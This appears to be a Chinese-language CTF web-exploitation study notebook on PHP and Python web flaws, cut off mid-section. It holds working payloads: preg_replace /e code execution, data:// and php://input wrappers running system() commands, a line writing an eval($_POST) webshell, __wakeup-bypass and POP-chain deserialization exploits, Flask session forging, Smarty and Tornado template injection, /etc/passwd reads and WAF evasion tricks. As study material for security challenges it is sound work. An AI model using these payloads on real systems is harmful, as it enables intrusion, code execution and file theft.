## array(2) { [0]=> string(7) "myclass" [1]=> string(9) "say_hello" } 
## 数组[0]=类名，数组[1]=方法名
call_user_func(array($classname, 'say_hello'));

#静态方法
call_user_func($classname .'::say_hello'); // As of 5.2.3

#调用对象的方法
$myobject = new myclass();
call_user_func(array($myobject, 'say_hello'));

?>
```

### `json_encode()`&`json_decode()`函数

  

[搞懂php中json\_decode()和json\_encode()的使用方法](https://blog.csdn.net/qq_27674439/article/details/94218176?ops_request_misc=&request_id=&biz_id=102&spm=1018.2226.3001.4187)

  

例：$cmd = json_decode($json, true)['cmd'];  
json格式为键值对模式，输入{"cmd":"ls"}

{%0a"cmd":"/bin/cat /home/rceservice/flag"%0a}

> 语法: string json\_encode ( mixed $value [, int $options = 0 \[, int $depth = 512 ]\] )

  

```php
//如果value是一个数组,如果是无下标的数组(即默认下标0,1,2,3),则返回值是[]包起来的数组,否则,是{}包起来的对象
<?php
$arr  = array(1,2,3,4);
$arr2 = array('a','b','c','d');
$arr3 = array(0=>1,1=>2,2=>3,3=>4);
$arr4 = array(1=>1,2=>2,3=>3,4=>4);
$arr5 = array('0'=>1,'1'=>2,'2'=>3,'3'=>4);
$arr6 = array('a'=>'a','b'=>'b','c'=>'c','d'=>'d');
$arr7 = array(
    array(1,2,3,4),
    array('a','b','c','d'),
    array('a'=>'a','b'=>'b','c'=>'c','d'=>'d')
);
$arr8 = array(
    'one' => array(1,2,3,4),
    'two'=> array('a','b','c','d'),
    'three' => array('a'=>'a','b'=>'b','c'=>'c','d'=>'d')
);
var_dump(json_encode($arr));
//结果: [1,2,3,4]
var_dump(json_encode($arr2));
//结果: ["a","b","c","d"]
var_dump(json_encode($arr3));
//结果: [1,2,3,4]
var_dump(json_encode($arr4));
//结果: {"1":1,"2":2,"3":3,"4":4}
var_dump(json_encode($arr5));
//结果: [1,2,3,4]
var_dump(json_encode($arr6));
//结果: {"a":"a","b":"b","c":"c","d":"d"}
var_dump(json_encode($arr7));
//结果: [[1,2,3,4],["a","b","c","d"],{"a":"a","b":"b","c":"c","d":"d"}]
var_dump(json_encode($arr8));
//结果: {"one":[1,2,3,4],"two":["a","b","c","d"],"three":{"a":"a","b":"b","c":"c","d":"d"}}
```

  

### 原生类SplFileObject读取文件

[PHP: SplFileObject - Manual](https://www.php.net/manual/zh/class.splfileobject.php)

当用文件目录遍历到了敏感文件时，可以用SplFileObject类，同样通过echo触发SplFileObject中的\_\_toString()方法。(该类不支持通配符，所以必须先获取到\*\*完整文件名称\*\*才行)

  

除此之外其实SplFileObject类，只能读取文件的第一行内容，如果想要全部读取就需要用到foreach函数，但若题目中没有给出**foreach函数**的话，就要用**伪协议**读取文件的内容。

  

```php
<?php
$a=new SplFileObject('ffffllllllaaaag.txt');
echo $a;
```

  

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661544582-b6f751d5-e99d-4ca9-898f-df30cf2f9c0f.png)

  

```php
<?php
$a=new SplFileObject('ffffllllllaaaag.txt');
foreach($a as $f){
	echo $a->__toString().'<br>';
}
```

### str\_replace()函数

```php
str_replace("php", "???", $file);
大小写绕过
```

### `preg_replace()`函数

> preg\_replace ( [mixed](language.pseudo-types.html#language.types.mixed) `$pattern` , [mixed](language.pseudo-types.html#language.types.mixed) `$replacement` , [mixed](language.pseudo-types.html#language.types.mixed) `$subject` [, int `$limit` = -1 \[, int `&$count` ]\] ) : [mixed](language.pseudo-types.html#language.types.mixed)

搜索`subject`中匹配`pattern`的部分， 以`replacement`进行替换。

  

[深入研究preg\_replace与代码执行](https://xz.aliyun.com/t/2557?time__1311=n4%2BxnieDqxg7Ki%3DD%2FWT4BK4iKP0K4NNqDC09eD)

[PHP正则表达式总结_php从左原则-CSDN博客](https://blog.csdn.net/moonx/article/details/50907347)

> **反向引用**
> 
> 对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

```php
if(isset($_GET['str'])){
        $str = preg_replace('/NSSCTF/',"",$_GET['str']);
        if($str === "NSSCTF"){
            echo "wow";
        }else{
            echo $str;
        } 
双写绕过：
  传参：NSSNSSCTFCTF	或	NNSSCTFSSCTF
  

“/e”模式命令执行：
  当pre_replace的参数pattern输入“/e” 修正符的时候 ,preg_replace()函数将参数replacement的代码当作PHP代码执行，并且以eval函数的方式执行。	
payload：?pat=/123/e&rep=phpinfo()&sub=123
    反向引用:
    preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str);
  若$re =  .* ,因为.*是通过 GET 方式传入，会变成 _*
payload：
    或 next.php?\S*={${phpinfo()}}		 //${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)
  var_dump(preg_replace('/(.*)/ie','strtolower("\\1")','{${phpinfo()}}'));// 结果：空字符串''
  var_dump(preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}'));// 结果：空字符串''
  执行时：eval(strtolower("{${phpinfo()}}"))；相当于strtolower("{${phpinfo()}}"))；执行了phpinfo()
```

### 数组有关特性

如果在代码里这样写会报错：

```php
echo [Peter][0]; //报错
```

但是是用GET传，他会认为你不打引号的东西是常量，  
所以如果你传参是这样子的:

```php
xxx.php?1=echo [Peter][0];//Peter
```

[Peter][0] 就会变成 ['Peter'][0]，并且输出 Peter

![0@JE)EZBW[{M35$O~R6~D5X_tmb.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/39170111/1712933563469-a0606cb9-7766-4f3f-b38c-c916444de98a.jpeg)

帮你做类型转换

### 通过运算符执行命令

\\ + - \* | & ~ !三目运算符

```php
eval("01system(ls);");//报错
eval("01-system(ls);");//执行system(ls);
1+phpinfo()+1;
1+phpinfo();
1+('phpinfo')();
1?phpinfo():0;
1|phpinfo();
1|phpinfo()|1;
~phpinfo();
!phpinfo();
```

### phpinfo信息泄漏

  

#### disable\_functions

> disable\_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。
> 
> (**eval**是语言构造器,不是函数，放在disable\_functions中是无法禁用的，如果想禁掉eval可以用php的扩展 Suhosin)

蚁剑插件市场绕过插件

  

#### open\_basedir

[浅谈几种Bypass open\_basedir的方法 - Hookjoy - 博客园 (cnblogs.com)](https://www.cnblogs.com/hookjoy/p/12846164.html)

> open\_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。
> 
> 假设open\_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。
> 
> 注意：用open\_basedir指定的**限制实际上是前缀，而不是目录名**。

#### CONTEXT\_DOCUMENT\_ROOT

`$_SERVER['CONTEXT_DOCUMENT_ROOT']` 变量，它返回当前运行 PHP 脚本所在上下文的文档根目录的绝对路径。

#### auto\_append\_file、 auto\_prepend\_file

> auto\_prepend\_file在页面顶部加载文件  
> auto\_append\_file在页面底部加载文件  
> 他们是通过require来自动调用文件的通过这个配置项
> 
> .user.ini有两个配置项：auto\_prepend\_file和auto\_append\_file。该配置项会让php文件在执行时包含一个指定的文件

  

> .user.ini的利用条件：
> 
> 1、含有.user.ini的文件夹下要有正常的php文件
> 
> 2、以fastcgi/cgi运行php
> 
> 3、php > 5.3.0
> 
> 注意：.user.ini文件加载的文件，会被php引擎解析，应该是当前目录下所有文件都会包含.user.ini中的被预加载的文件

  

```plain
上传.user.ini绕过黑名单检测：

GIF89a                  //绕过exif_imagetype()
auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。
auto_append_file=a.jpg  //解析后进行包含
```

  

### php伪协议

利用filter伪协议绕过死亡exit:  
[file\_put\_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163#toc-2)

#### 解题历史

```php
if(isset($file))
{
  if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index"))
{
    include ($file . '.php');
}

//$file中必须含有woofers,meowers,index中的一项，才能够文件包含file.php
payload有：
  ?category=php://filter/read=convert.base64-encode/woofers/resource=flag
	?category=php://filter/read=convert.base64-encode/meowers/resource=flag
	?category=php://filter/read=convert.base64-encode/index/resource=flag
  ?category=php://filter/convert.base64-encode/resource=woofers/../flag
```

#### php://filter

用于读取源码。

```plain
以base64编码的方式读取指定文件的源码:

?file=php://filter/convert.base64-encode/resource=文件路径

php://filter/read=convert.base64-encode/resource=index.php

php://fileter/convert.base64-decode/resource=http://xxxx.xxx.xxx.xx/flag.php?
使用php://filter伪协议是可以和data伪协议一起用的
php://filter/read=convert.base64-encode/resource=data://,123
```

php filter chain

```python
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/flag
```

#### data://

和include函数结合时，用户输入的data://流会被当作php文件执行。

```php
遇到include()且flag、php被过滤
   if(!preg_match("/flag/i", $c)){
      include($c);
      echo $flag;
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTs/Pg==		//<?php system("cat f*");?>

1、data://text/plain,
?file=data://text/plain,<?php%20phpinfo();?>

2、data://text/plain;base64,
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```
```plain
base64编码图片数据
data:image/png;base64,iVBORw0KG

<?php phpinfo();
data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
```

  

#### php://input

  

遇到**file\_get\_contents()、include()**用php://input或data://text/plain,绕过

  

**php://input**可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。

```php
输入file=php://input，然后使用burp抓包，写入php代码：
<?php system("ls /"); ?>
<?php system("cat /flag"); ?>

生成包含一句话木马的文件：
<?php fwrite(fopen("shell.php","w"),'<?php @eval($_POST[123]);?>')?>
```

  

#### file://

  

用于访问本地文件系统，并且不受allow\_url\_fopen，allow\_url\_include影响  
file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)

  

```plain
?file=file:///etc/passwd
```

  

#### zip://

zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。

  

```plain
zip://中只能传入绝对路径。
要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
只需要是zip的压缩包即可，后缀名可以任意更改。
相同的类型的还有zlib://和bzip2://

zip://[压缩包绝对路径]#[压缩包文件]
?file=zip://D:\zip.jpg%23phpinfo.txt

compress.zlib://flag.php
```

#### phar://

### PHP字符串解析

PHP将查询字符串（在URL或正文中）转换为内部关联数组 $*GET 或关联数组 $*POST

例如：/?foo=bar变成Array([foo] => “bar”)

值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替

例如，/?%20news[id%00=42会转换为Array(\[news\_id] => 42)

如果一个IDS/IPS或WAF中有一条规则是当news\_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：

```plain
/news.php?%20news[id%00=42"+AND+1=0-
```

上述PHP语句的参数%20news[id%00的值将存储到$\_GET\[“news\_id”]中。

> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
> 
> 1.删除前后的空白符（空格符，制表符，换行符等统称为空白符）  
> 2.将某些字符转换为下划线（包括空格）

| **User input** | **Decoded PHP** | **variable name** |
| --- | --- | --- |
| %20foo_bar%00 | foo_bar | foo_bar |
| foo%20bar%00 | foo bar | foo_bar |
| foo%5bbar | foo[bar | foo_bar |

假如waf不允许num变量传递字母：

[http://www.xxx.com/index.php?num=aaaa](http://www.xxx.com/index.php?num=aaaa)   //显示非法输入的话

那么我们可以在num前加个空格：

[http://www.xxx.com/index.php](http://www.xxx.com/index.php)? num=aaaa   //显示非法输入的话

这样waf就找不到num这个变量了，因为现在的变量叫" num"，而不是"num"。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符

```php
某些过滤字符 可用chr进行绕过:
calc.php? num=2;var_dump(scandir(chr(47)))  //chr(47)='/'
//f1agg
calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) //用`.`连接
```
```php
比如传入AA_BB.CC这个变量，PHP是不允许变量名中含有. 的，会默认将不合法字符替换为_,如下：
  
<?php 
var_dump($_POST);
?>         
传值：AA.BB.CC=14
输出：array(1) { ["AA_BB_CC"]=> string(2) "14" }

但输入AA[BB.CC它就只替换 [ 
输出 array(1) { [“AA_BB.CC”]=> string(2) “14” }
```

  

[利用PHP的字符串解析特性Bypass](https://www.freebuf.com/articles/web/213359)

### 伪随机数

mt\_srand(seed)

rand(1,10)每次生成的数是一样的

```python
str1 ='4BvXIebEIq'
str2 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
result =''

length = str(len(str2)-1)
for i in range(0,len(str1)):
    for j in range(0,len(str2)):
        if str1[i] ==  str2[j]:
            result += str(j) + ' ' +str(j) + ' ' + '0' + ' ' + length + ' '
            break
print(result)
```

php\_mt\_seed是一个可以根据一串int 或者一串由许多4个一组的数字组成来爆破的seed值

```python
./php_mt_seed xxx
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1714200895663-a9b6a851-4eab-4235-867b-5d054aa58142.png)

获取到种子 然后 在 php7.1以上的环境运行

```php
<?php
mt_srand(种子);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
echo "<p id='p1'>".$str."</p>";
?>
```

### hash\_hmac()函数

> **hash\_hmac** ( string $algo , string $data , string $key [, bool $raw\_output = **FALSE** ] ) : string

如果data传入的值为数组，那么就会返回NULL

### data()

可以使用反斜线进行转义来阻止函数解析格式字符串中的可识别字符。

如果反斜线和要转义的字符连在一起依然是一个有效的字符序列，那么需要对 反斜线再次进行转义。

```php
echo date('/flag');    # /fMondaypm2
echo date('/f\l\a\g'); # /flag
```

## JavaScript

### encodeURLComponent()函数

> 这个函数使url编码，url中的特殊字符(, / ? : @ & = + $ #)都进行编码,该方法不会对`ASCII`字母和数字进行编码，也不会对这些`ASCII`标点符号进行编码： - \_ . ! ~ \* ’ ( ) 。

-   [[RoarCTF 2019]Easy Calc1](https://blog.csdn.net/m0_73728268/article/details/129502839?ops_request_misc=&request_id=&biz_id=102&utm_term=%5BRoarCTF%202019%5DEasy%20Calc1&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-8-129502839.nonecase&spm=1018.2226.3001.4187)

---

## 反序列化

[详细说明](https://blog.csdn.net/qq_48904485/article/details/123642420?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22123642420%22%2C%22source%22%3A%22BigColaXD%22%7D&fromshare=blogdetail)

[如何自动化挖掘 php 反序列化链](https://paper.seebug.org/1480/)

[PHP反序列化漏洞学习](https://www.bilibili.com/video/BV1R24y1r71C/?p=12&share_source=copy_web&vd_source=4d76b9770c7d2f0fd06d1a2b0cd99131)

```php
常见的几个魔法函数:
    _destruct(): 对象被销毁时触发一般来说，也是Pop链的入口。
    __toString(): 类对象遇到字符串操作时触发。如出现echo、pre_match、strtolower、file_exists、(弱比较)时
    __construct()：new 一个对象时触发，__construct函数内的语句可以手动修改
    __wakeup():   执行unserialize()时，先会调用这个函数
    __sleep() 	执行serialize()时，先会调用这个函数
    __call()：    当调用了类对象中不存在或者不可访问的方法时触发。
    __callStatic()： 当调用了类对象中不可访问的静态方法时触发。
    __get()：     当访问一个类中的属性不存在或者privte 的时候 会被调用(本类没有而别的类有的属性)  
    __set()：     当试图向类对象中不可访问的属性赋值时触发。
    __unset() ------- 在不可访问的属性上使用unset()时触发
    __invoke():   当对象调用为函数时触发.看哪⾥⽤到了类似$a()这种的
    __isset() ------- 在不可访问的属性上调用isset()或empty()触发
序列化字符串中的类名可修改大小写(绕过正则)
```

[在线16进制字符串转换工具 - 在线工具网](https://tool.hiofd.com/hex-convert-string-online/)

```php
S:1:"\61"; ---a 可以将16进制编码成字符，可以进行绕过特定字符
```

[Php原生类总结](https://xz.aliyun.com/t/13785)

```php
$a=new SplFileObject('/flag');
echo $a;
```

### 字符串逃逸

从别的属性中逃逸出员属性

```php
减少逃逸
第一个字符串：过滤减少，吃掉有效代码。
第二个字符串：构造代码

增多逃逸
第一个字符串：过滤增多，吐出多余代码
多余代码：构造成逃逸成员属性
```

### phar反序列化

  

例：反序列化数组

```php
$username  = "this_is_secret"; 
$password  = "this_is_not_known_to_you"; 
$data_unserialize = unserialize($_GET['info']);
if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){
    echo $flag;
?>
  
PHP 关联数组：
  $age=array("Peter"=>"35","Ben"=>"37","Joe"=>"43");

考查的是 PHP 的弱比较。
在 PHP 弱比较时会发生类型转换，若一端为布尔类型，另一端为其他类型，在转换时会将其他类型转换为布尔类型
  
payload:
<?php
$demo=array("username"=>true,"password"=>true);
echo serialize($demo);
?>
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

  

### 绕过\_\_wakeup

  

根据`cve-2016-7124`，当对象属性个数大于真实对象属性个数时跳过`__wakeup()`的执行

  

绕过方法1:

通过加一个属性，并把序列化后字符串对象属性个数改为1

[[天翼杯 2021]esay\_eval](https://blog.csdn.net/qq_46266259/article/details/128891937)

> 给类B手动添加public $b;  
> O:1:"B":2:{s:1:"a";O:1:"A":1:{s:4:"code";s:10:"phpinfo();";}s:1:"b";N;}  
> 修改后  
> O:1:"B":1:{s:1:"a";O:1:"A":1:{s:4:"code";s:10:"phpinfo();";}s:1:"b";N;}

  

绕过方法2:

  

```php
根据源代码构造：
<?php
class Name{
    private $username = 'admin';
    private $password = '100';
}
$select = new Name();
$res=serialize($select);
echo $res;
?>
```

  

\\输出结果：

  

O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";s:3:"100";}

  

有4个`空字符`需要用`%00`代替，讲**属性数量+1**来绕过反序列化中的\_\_wakeup:

  

O:4:"Name":***3***：{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}

---

**例2：\_\_call & \_\_get**

  

```php
题目：
class entrance
{
    public $start;

    function __construct($start)
    {
        $this->start = $start;
    }

    function __destruct()
    {
        $this->start->helloworld();
    }
}

class springboard
{
    public $middle;

    function __call($name, $arguments)
    {
        echo $this->middle->hs;
    }
}

class evil
{
    public $end;

    function __construct($end)
    {
        $this->end = $end;
    }

    function __get($Attribute)
    {
        eval($this->end);
    }
}

if(isset($_GET['serialize'])) {	
    unserialize($_GET['serialize']);
} else {
    highlight_file(__FILE__);
}
```

  

```php
**题解1：**
<?php
class entrance
{
    public $start;
}

class springboard
{
    public $middle;
}

class evil
{
    public $end;
    function __construct($end)
    {
        $this->end = $end;
    }
}

$a=new entrance();
$a->start=new springboard();
$a->start->middle=new evil("system('cat /f*');");   #new evil(值)需要有__construct函数，且其中的"值"传入__construct(值)
echo serialize($a);
?>
`O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:18:"system('cat /f*');";}}}`
```

  

```php
**题解2：**
<?php
class entrance
{
    public $start;
}

class springboard
{
    public $middle;
}

class evil
{
    public $end;
}

$payload=new entrance();
$payload->start=new springboard();
$payload->start->middle=new evil();
$payload->start->middle->end="system('cat /f*');";  #与题解1不同，对变量end赋值而不是new evil(值)，所以不需要__construct函数
$a=serialize($payload);
echo $a;
?>
```
---

## flask session 伪造

> flask的session保存在客户端，一般只是加了签名来防止被截取修改，但是如果没有加密我们就可以对session进行解码来获取其中的用户数据。  
> 如果我们在获取到签名的**秘钥**`SECRET_KEY`，就可以按照解码出来的数据进行伪造，重新生成签名的session来达到欺骗服务端。  
> flask的session使用base64对bytes类型的用户数据进行编码，而且编码之前可能进行了压缩(session以 "."  开头时表示进行了压缩) flask 保存在cookie里面的session一般格式为 data.timestamp.signature ##  客户端session安全学习：[https://www.leavesongs.com/PENETRATION/client-session-security.html#](https://www.leavesongs.com/PENETRATION/client-session-security.html#)

```plain
python flask_session_cookie_manager3.py decode -c "session值" (-s "key值")
python flask_session_cookie_manager3.py encode -s "key值" -t "我们需要伪造的值"
```
```python
python 中使用 uuid 模块生成 UUID（通用唯一识别码）。
可以使用 uuid.getnode()
方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。
那么/sys/class/net/eth0/address，这个就是网卡的位置，读取他进行伪造即可。
具体方法如下，先用file协议读取网卡mac地址，再利用脚本进行解密、修改和加密。
#file:///sys/class/net/eth0/address
```

## Unicode欺骗

  

### nodeprep.prepare函数

  

`nodeprep.prepare`这个方法是将大写字母转换成小写字母，但是它存在一个问题：  
它会将unicode编码的ᴬ转化成A

  

## 弱密码爆破

  

BS字典爆破

  

[BUUCTF-[HCTF 2018]admin1](https://blog.csdn.net/qq_46918279/article/details/121294915?ops_request_misc=&request_id=&biz_id=102&utm_term=%5BHCTF%202018%5Dadmin%201&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-121294915.142%5Ev96%5Epc_search_result_base3&spm=1018.2226.3001.4187)

  

## SSTI注入

  

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661608479-1e380b5c-e6ee-42af-b76d-a90403dc59fd.png)

### Flask-Jinja2

[链接](https://www.yuque.com/bigcolaxd/yon4ap/dr8aw65hpls3qrx1)

### tornado

  

Tornado框架的附属文件**handler.settings**中存在**cookie\_secret**

  

[[护网杯 2018]easy\_tornado](https://blog.csdn.net/qq_51927659/article/details/116031923?ops_request_misc=%7B%22request%5Fid%22%3A%22170350910216800184133831%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170350910216800184133831&biz_id=0&spm=1018.2226.3001.4187)

  

```python
render()是tornado里的函数，可以生成html模板
/file?filename=/fllllllllllllag&filehash=md5(cookie_secret+md5(filename))
返回http://22b7dd19-d653-4f52-91bd-e3713a459849.node4.buuoj.cn:81/error?msg=Error
/error?msg={{1}}	//得到回显，说明此处是存在SSTI，通过msg的值进行传参
error?msg={{handler.settings}}	//得到 'cookie_secret': 'a019afa9-06c4-4d02-85da-0183985ef37d'
/file?filename=/fllllllllllllag&filehash=9bcd3f6ab6a5bace3fd4528b989ad1cc
```

  

### Smarty

  

[PHP的模板注入(Smarty模板)](https://www.freesion.com/article/41281163044/)

  

Smarty是一个**PHP**的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。

  

```php
根据hint猜测出这个IP的值受XFF头控制 
在请求头添加 X-Forwarded-For:1	//回显1	存在SSTI
X-Forwarded-For:{{7*7}}	//49
X-Forwarded-For={{system("ls /")}}	//回显中有/flag
X-Forwarded-For: {{system("cat /flag")}}
```

  

```php
{if phpinfo()}{/if}
{if readfile('文件路劲')}{/if}
{if show_source('文件路径')}{/if}
{if passthru('操作命令')}{/if}
{if system('操作命令')}{/if}
```

  

## JavaScript Prototype 污染攻击

  

[https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)

  

## RCE

[RCE漏洞详解及绕过总结(全面)](https://blog.csdn.net/m0_73185293/article/details/131557169)

```php
系统命令执行函数:
system()：能将字符串作为OS命令执行，且返回命令执行结果；
exec()：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显);执行不输出 需要echo
shell_exec()：能将字符串作为OS命令执行,后者返回全部信息;执行不输出	需要echo
passthru()：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；
popen()：打开进程文件指针
proc_open()：与popen()类似
pcntl_exec()：在当前进程空间执行指定程序；
**反引号**``：反引号``内的字符串会被解析为OS命令；

代码执行函数

eval()：将字符串作为php代码执行；
assert()：将字符串作为php代码执行；
preg_replace()：正则匹配替换字符串；
create_function()：主要创建匿名函数；
call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；
call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；
**可变函数**：若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数执行；
```

### 常见绕过姿势

```bash
eval(参数);
##echo+``
echo `nl fl''ag.p''hp`;
echo `cat fl''ag.p''hp`;
echo `cat fl*ag.p*hp`;e
echo `cp fl*ag.p*hp 1.txt | cat 1.txt`;
echo(`ls`);

##exec、print、passthru
echo exec("cat%20f\lag.p\hp");
echo(implode('---',scandir("/")));	#用implode函数将数组转换成字符串再打印
